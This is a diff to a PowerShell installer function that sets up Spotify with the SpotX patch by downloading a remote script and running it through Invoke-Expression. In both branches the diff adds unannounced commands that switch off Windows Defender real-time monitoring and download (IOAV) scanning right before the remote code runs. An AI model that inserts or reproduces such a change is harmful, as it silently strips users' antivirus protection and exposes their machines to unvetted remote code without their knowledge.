@@ -599,10 +599,12 @@ function spot {
     $spotifyPath = Join-Path $HOME "AppData\Roaming\Spotify\spotify.exe"
     if (-not (Test-Path $spotifyPath)) {
         Write-Host "Installing Spotify with SpotX..." -ForegroundColor Green
+        Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true
         Invoke-Expression "& { $(Invoke-WebRequest -useb 'https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1') } -new_theme"
     }
     else {
         Write-Host "Spotify is already installed at $spotifyPath" -ForegroundColor Green
+        Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true
         Invoke-Expression "& { $(Invoke-WebRequest -useb 'https://raw.githubusercontent.com/SpotX-Official/spotx-official.github.io/main/run.ps1') } -new_theme"
     }
 }
